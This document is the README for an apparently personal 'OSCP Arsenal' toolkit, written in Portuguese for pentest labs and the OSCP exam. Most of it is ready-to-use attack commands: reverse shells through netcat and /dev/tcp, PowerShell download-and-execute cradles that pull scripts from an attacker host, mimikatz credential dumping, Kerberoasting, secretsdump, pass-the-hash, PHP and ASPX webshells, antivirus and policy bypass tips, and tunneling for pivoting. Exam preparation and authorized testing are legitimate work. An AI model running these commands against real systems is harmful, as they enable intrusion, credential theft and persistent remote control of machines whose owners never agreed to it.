# OSCP Arsenal

Coleção de ferramentas essenciais para pentest, organizadas para uso rápido em labs e na prova OSCP.

## Instalação

```bash
chmod +x setup-arsenal-v2.sh
./setup-arsenal-v2.sh
```

O script cria a pasta `~/arsenal` com todas as ferramentas organizadas por categoria.

---

## Estrutura

```
arsenal/
├── windows/
│   ├── privesc/      # Escalação de privilégios Windows
│   ├── enum/         # Enumeração e coleta de credenciais
│   ├── shells/       # Reverse shells e conexões
│   └── transfer/     # Scripts para transferir arquivos
├── linux/
│   ├── privesc/      # Escalação de privilégios Linux
│   ├── enum/         # Enumeração Linux
│   └── shells/       # Binários para conexão reversa
├── ad/
│   ├── enum/         # Enumeração de Active Directory
│   ├── exploit/      # Ataques a AD (Kerberos, etc)
│   └── lateral/      # Movimentação lateral
├── pivoting/         # Tunelamento e pivoting
├── webshells/        # Shells web (PHP, ASPX, JSP)
├── wordlists/        # Referência de wordlists
└── CHEATSHEET.md     # Comandos rápidos
```

---

## Windows

### Privesc (`windows/privesc/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **winPEASx64.exe** | Enumera TUDO: serviços, permissões, credenciais, paths vulneráveis | `.\winPEASx64.exe` |
| **winPEASx86.exe** | Versão 32-bit do winPEAS | `.\winPEASx86.exe` |
| **winPEAS.bat** | Versão batch (não precisa de .NET) | `.\winPEAS.bat` |
| **PowerUp.ps1** | Encontra misconfigurations comuns de privesc | `Import-Module .\PowerUp.ps1; Invoke-AllChecks` |
| **PrivescCheck.ps1** | Alternativa ao PowerUp, mais atualizado | `Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck` |
| **Seatbelt.exe** | Coleta info de segurança do host | `.\Seatbelt.exe -group=all` |
| **SharpUp.exe** | Versão C# do PowerUp | `.\SharpUp.exe audit` |
| **PrintSpoofer64.exe** | Privesc via SeImpersonate (Windows 10/Server 2016+) | `.\PrintSpoofer64.exe -i -c cmd` |
| **GodPotato-NET4.exe** | Privesc via SeImpersonate (funciona em mais versões) | `.\GodPotato.exe -cmd "cmd /c whoami"` |
| **JuicyPotatoNG.exe** | Privesc via SeImpersonate/SeAssignPrimaryToken | `.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"` |
| **SweetPotato.exe** | Combina vários potato exploits | `.\SweetPotato.exe -p cmd.exe -a "/c whoami"` |

**Quando usar Potatoes?**
Se `whoami /priv` mostrar `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` habilitados (comum em contas de serviço como IIS, SQL Server).

### Enum (`windows/enum/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **mimikatz/** | Extrai senhas, hashes, tickets Kerberos da memória | `mimikatz.exe "sekurlsa::logonpasswords" exit` |
| **SharpHound.exe** | Coleta dados do AD para BloodHound | `.\SharpHound.exe -c all` |
| **accesschk.exe** | Verifica permissões em arquivos/serviços/registry | `.\accesschk.exe -uwcqv "Users" * /accepteula` |

### Shells (`windows/shells/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **nc64.exe / nc.exe** | Netcat para Windows | `nc64.exe LHOST LPORT -e cmd.exe` |
| **powercat.ps1** | Netcat em PowerShell | `IEX(New-Object Net.WebClient).DownloadString('http://LHOST/powercat.ps1'); powercat -c LHOST -p LPORT -e cmd` |
| **Invoke-PowerShellTcp.ps1** | Reverse shell PowerShell (Nishang) | Editar IP/porta no final do arquivo, depois `IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1')` |
| **Invoke-ConPtyShell.ps1** | Shell interativa completa (PTY) | `IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell LHOST LPORT` |

### Transfer (`windows/transfer/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **plink.exe** | SSH client (túneis, port forward) | `plink.exe -R 8080:127.0.0.1:80 user@LHOST` |
| **wget.ps1** | Download simples via PowerShell | `powershell -ep bypass .\wget.ps1 http://LHOST/file C:\file` |
| **download.vbs** | Download via VBScript (sistemas antigos) | `cscript download.vbs http://LHOST/file C:\file` |

---

## Linux

### Privesc (`linux/privesc/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **linpeas.sh** | Enumera TUDO: SUID, capabilities, crons, senhas | `chmod +x linpeas.sh && ./linpeas.sh` |
| **LinEnum.sh** | Enumeração similar, mais leve | `chmod +x LinEnum.sh && ./LinEnum.sh` |
| **lse.sh** | Linux Smart Enumeration - níveis de detalhe | `./lse.sh -l 1` (nível 1-2) |
| **les.sh** | Sugere exploits de kernel baseado na versão | `./les.sh` |
| **les2.pl** | Alternativa em Perl | `perl les2.pl` |
| **pspy64 / pspy32** | Monitora processos SEM root (encontra crons ocultos) | `./pspy64` (deixar rodando e observar) |

**Workflow típico:**
1. Rodar `linpeas.sh` primeiro
2. Se suspeitar de cron job, rodar `pspy64`
3. Se kernel antigo, rodar `les.sh`

### Enum (`linux/enum/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **unix-privesc-check** | Verifica configurações inseguras | `./unix-privesc-check standard` |

### Shells (`linux/shells/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **nc** | Netcat estático (funciona sem dependências) | `./nc LHOST LPORT -e /bin/bash` |

---

## Active Directory

### Enum (`ad/enum/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **PowerView.ps1** | Enumeração completa de AD via PowerShell | `Import-Module .\PowerView.ps1; Get-NetDomain; Get-NetUser; Get-NetGroup` |
| **adPEAS.ps1** | Automação de enumeração AD | `Import-Module .\adPEAS.ps1; Invoke-adPEAS` |
| **SharpHound.exe** | Coleta dados para BloodHound | `.\SharpHound.exe -c all` |
| **Snaffler.exe** | Encontra arquivos sensíveis em shares | `.\Snaffler.exe -s -o snaffler.log` |
| **Import-ActiveDirectory.ps1** | Importa módulo AD sem instalar RSAT | `Import-Module .\Import-ActiveDirectory.ps1` |

**PowerView comandos essenciais:**
```powershell
Get-NetDomain                    # Info do domínio
Get-NetUser                      # Lista usuários
Get-NetGroup                     # Lista grupos
Get-NetComputer                  # Lista computadores
Find-LocalAdminAccess            # Onde tenho admin local?
Invoke-ShareFinder               # Shares acessíveis
Get-NetGPO                       # Group Policies
```

### Exploit (`ad/exploit/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **Rubeus.exe** | Ataques Kerberos (roast, tickets, delegation) | Ver exemplos abaixo |
| **Certify.exe** | Encontra e explora vulnerabilidades em AD CS | `.\Certify.exe find /vulnerable` |
| **Whisker.exe** | Ataque Shadow Credentials | `.\Whisker.exe add /target:USER` |
| **Invoke-Mimikatz.ps1** | Mimikatz em PowerShell (in-memory) | `Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz` |
| **kerbrute_linux** | Bruteforce/enum de usuários via Kerberos | `./kerbrute_linux userenum -d DOMAIN --dc DC_IP users.txt` |
| **kerbrute.exe** | Versão Windows | `.\kerbrute.exe userenum -d DOMAIN --dc DC_IP users.txt` |
| **GetUserSPNs.py** | Kerberoasting via Impacket | `python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request` |
| **secretsdump.py** | Dump de hashes (SAM, NTDS, LSA) | `python3 secretsdump.py DOMAIN/user:pass@TARGET` |
| **psexec.py** | Shell remota via SMB | `python3 psexec.py DOMAIN/user:pass@TARGET` |

**Rubeus comandos essenciais:**
```powershell
# Kerberoasting - extrai TGS de contas com SPN
.\Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting - usuários sem pre-auth
.\Rubeus.exe asreproast /outfile:asrep.txt

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Request TGT com hash
.\Rubeus.exe asktgt /user:USER /rc4:HASH /ptt
```

### Lateral Movement (`ad/lateral/`)

| Ferramenta | O que faz | Como usar |
|------------|-----------|-----------|
| **Invoke-TheHash.ps1** | Pass-the-Hash via SMB/WMI | `Invoke-SMBExec -Target IP -Domain DOMAIN -Username USER -Hash HASH -Command "cmd"` |
| **Invoke-WMIExec.ps1** | Execução remota via WMI com hash | `Invoke-WMIExec -Target IP -Username USER -Hash HASH -Command "cmd"` |
| **Invoke-SMBExec.ps1** | Execução remota via SMB com hash | Similar ao WMIExec |
| **pstools/** | Ferramentas Sysinternals (PsExec, etc) | `.\PsExec.exe \\TARGET -u USER -p PASS cmd.exe` |

---

## Pivoting

### Ferramentas (`pivoting/`)

| Ferramenta | O que faz | Quando usar |
|------------|-----------|-------------|
| **chisel_linux64** | Túnel TCP/SOCKS sobre HTTP | Quando precisa acessar rede interna via proxy |
| **chisel_win64.exe** | Versão Windows | Idem |
| **ligolo_proxy** | Cria interface TUN para pivoting | Alternativa mais moderna ao chisel |
| **ligolo_agent_linux** | Agent Linux para ligolo | Roda na máquina comprometida |
| **ligolo_agent.exe** | Agent Windows | Idem |
| **socat_linux** | Relay/forward de portas | Port forwarding simples |
| **rpivot/** | Reverse SOCKS proxy (Python) | Quando precisa SOCKS reverso |
| **tunnel.aspx/php/jsp** | Webshell que cria túnel SOCKS | Quando só tem acesso web |
| **neo-regeorg/** | Versão melhorada do reGeorg | Túnel via webshell |

**Chisel (mais usado):**
```bash
# KALI (server)
./chisel_linux64 server -p 8000 --reverse

# ALVO (client) - cria SOCKS na porta 1080 do Kali
./chisel_win64.exe client KALI_IP:8000 R:socks

# KALI - usar proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains evil-winrm -i TARGET -u user -p pass
```

**Ligolo-ng (mais moderno):**
```bash
# KALI - criar interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./ligolo_proxy -selfcert

# ALVO
./ligolo_agent_linux -connect KALI_IP:11601 -ignore-cert

# KALI - no console do ligolo
session        # seleciona
start          # inicia

# KALI - adicionar rota
sudo ip route add 10.10.10.0/24 dev ligolo
```

**SSH Tunneling (se tiver SSH):**
```bash
# SOCKS proxy
ssh -D 1080 user@pivot

# Port forward local
ssh -L 8080:INTERNO:80 user@pivot
# Agora localhost:8080 acessa INTERNO:80

# Port forward reverso
ssh -R 4444:localhost:4444 user@pivot
# Agora pivot:4444 redireciona pra seu Kali:4444
```

---

## Webshells

| Arquivo | Linguagem | Como usar |
|---------|-----------|-----------|
| **simple-backdoor.php** | PHP | Upload e acesse `?cmd=whoami` |
| **php-reverse-shell.php** | PHP | Editar IP/porta, upload, acessar |
| **cmdasp.aspx** | ASP.NET | Upload para IIS, executar comandos |
| **cmd.jsp** | JSP | Upload para Tomcat/JBoss |

---

## Wordlists

Referência das principais wordlists (já vem no Kali):

| Uso | Path |
|-----|------|
| Senhas gerais | `/usr/share/wordlists/rockyou.txt` |
| Senhas top 10k | `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` |
| Usernames | `/usr/share/seclists/Usernames/Names/names.txt` |
| Diretórios web | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| Arquivos web | `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt` |

```bash
# Instalar seclists se não tiver
sudo apt install seclists -y
```

---

## Fluxo Típico OSCP

### 1. Enumeração Inicial
```bash
nmap -sC -sV -oA initial TARGET
```

### 2. Foothold
- Explorar serviços encontrados
- Web? SQL injection, upload, LFI
- SMB? Null session, EternalBlue

### 3. Shell
```bash
# Kali - listener
nc -lvnp 4444

# Alvo - reverse shell
bash -i >& /dev/tcp/KALI/4444 0>&1
```

### 4. Upgrade Shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 5. Privesc
```bash
# Linux
./linpeas.sh

# Windows
.\winPEASx64.exe
```

### 6. Proof
```bash
# Linux
hostname && whoami && cat /root/proof.txt && ip a

# Windows
hostname && whoami && type C:\Users\Administrator\Desktop\proof.txt && ipconfig
```

---

## Dicas

1. **Sempre sirva arquivos via HTTP:**
   ```bash
   cd ~/arsenal && python3 -m http.server 80
   ```

2. **Transfira para Windows:**
   ```powershell
   certutil -urlcache -f http://KALI/winPEASx64.exe C:\Temp\winpeas.exe
   ```

3. **Transfira para Linux:**
   ```bash
   wget http://KALI/linpeas.sh -O /tmp/linpeas.sh
   ```

4. **Proxychains config:** Edite `/etc/proxychains4.conf`:
   ```
   socks5 127.0.0.1 1080
   ```

5. **Crackeando hashes:**
   ```bash
   # Kerberoast
   hashcat -m 13100 hashes.txt rockyou.txt
   
   # AS-REP
   hashcat -m 18200 asrep.txt rockyou.txt
   
   # NTLM
   hashcat -m 1000 ntlm.txt rockyou.txt
   ```

---

## Troubleshooting

| Problema | Solução |
|----------|---------|
| PowerShell bloqueado | `powershell -ep bypass` |
| .exe bloqueado por AV | Usar versão .ps1 ou .bat |
| Sem outbound | Usar túnel DNS ou pivoting |
| Chisel não conecta | Tentar porta 80 ou 443 |
| Proxychains lento | Usar `-q` e scans targeted |

---

## Links Úteis

- [GTFOBins](https://gtfobins.github.io/) - Binários Linux para privesc
- [LOLBAS](https://lolbas-project.github.io/) - Binários Windows para bypass
- [HackTricks](https://book.hacktricks.xyz/) - Wiki completa de técnicas
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payloads prontos
